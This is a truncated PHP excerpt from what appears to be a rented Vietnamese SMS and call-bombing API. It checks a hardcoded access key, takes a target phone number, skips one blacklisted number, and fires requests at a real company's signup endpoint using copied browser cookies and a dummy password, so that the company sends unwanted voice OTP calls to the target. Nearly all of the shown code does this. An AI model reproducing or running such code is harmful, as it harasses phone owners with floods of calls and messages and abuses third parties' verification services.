...
if(isset($_GET["key"])){
	$key = $_GET["key"]; 
	if($key == "246" or $check["status"] == "success"){
		if(isset($_GET["phone"])){
			$sdt = $_GET["phone"];
		...
		echo ECHOJSON(array("status" => "error", "msg" => "Key không tồn tại trên hệ thống")); exit;
	}
} else {
	echo ECHOJSON(array("msg" => "Liên Hệ Admin Api Để Thuê Api")); exit;
}
if(strlen($sdt) < 10){
	echo ECHOJSON(array("status" => "error","msg" => "Vui Lòng Nhập Đúng Số Phone")); exit;
} else if(!$sdt){
	echo ECHOJSON(array("status" => "error","msg" => "Vui Lòng Nhập Đúng Số Phone")); exit;
} else if($sdt == "0843081105" or $sdt =="#" or  $sdt == "#"  or $sdt == "#"  or  $sdt == ""){
	echo ECHOJSON(array("msg" => "Hiện tại số điện thoại này nằm trong danh sách đen blacklist vui lòng không spam sms")); exit;
}
///Calll Otp
$TIENOI1 = TIENOI1($sdt);//otp call
...
#####FUNCTION#######
function TIENOI0($sdt){
$head = array(
    "authority: app.tienoi.com.vn",
    "accept: application/json, text/plain, */*",
    "accept-language: vi,fr-FR;q=0.9,fr;q=0.8,en-US;q=0.7,en;q=0.6,zh-CN;q=0.5,zh;q=0.4",
    "content-type: application/json",
    "cookie: _gcl_au=1.1.2026880691.1689397089; _gid=GA1.3.142479149.1689397089; _tt_enable_cookie=1; _ttp=XXkkwkexBYDUCnZKEd2OFarX8h3; _acbswcu_l=0; _acbswcu_stateData=eyJzaG93IjpmYWxzZSwiaGVpZ2h0IjpudWxsLCJyaWdodCI6MH0%3D; _ga=GA1.3.549045696.1689397089; _ga_MTBX8SYKKD=GS1.1.1689397089.1.1.1689397990.0.0.0",
...
$data = '{"mobilePhone":"'.$sdt.'","password":"Abc123@@","passwordConfirmation":"Abc123@@","isVoiceSms":true}';

$access = CURL("POST", "https://app.tienoi.com.vn/portal/api/v1/public/signUp/sendAcceptanceCode", $data, $head, true);
